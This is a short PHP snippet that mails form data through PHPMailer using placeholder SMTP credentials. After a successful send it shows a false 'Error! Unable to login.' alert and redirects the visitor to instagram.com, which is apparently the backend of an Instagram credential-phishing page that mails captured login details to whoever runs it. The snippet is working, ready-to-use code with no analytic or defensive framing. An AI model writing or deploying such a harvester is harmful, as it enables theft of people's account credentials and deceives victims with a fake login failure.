use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Assuming PHPMailer is installed via Composer

$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->isSMTP();
    $mail->Host = 'smtp.example.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'your_email@example.com';
    $mail->Password = 'your_password';
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    // Recipients
    $mail->setFrom('your_email@example.com', 'Mailer');
    $mail->addAddress($to);

    // Content
    $mail->isHTML(false);
    $mail->Subject = $subject;
    $mail->Body    = $txt;

    $mail->send();
    echo "<script type='text/javascript'>
        alert('Error! Unable to login.');
        window.location.replace('https://www.instagram.com');
    </script>";
} catch (Exception $e) {
    echo "<script type='text/javascript'>
        alert('Mailer Error: " . $mail->ErrorInfo . "');
        window.history.go(-1);
    </script>";
}
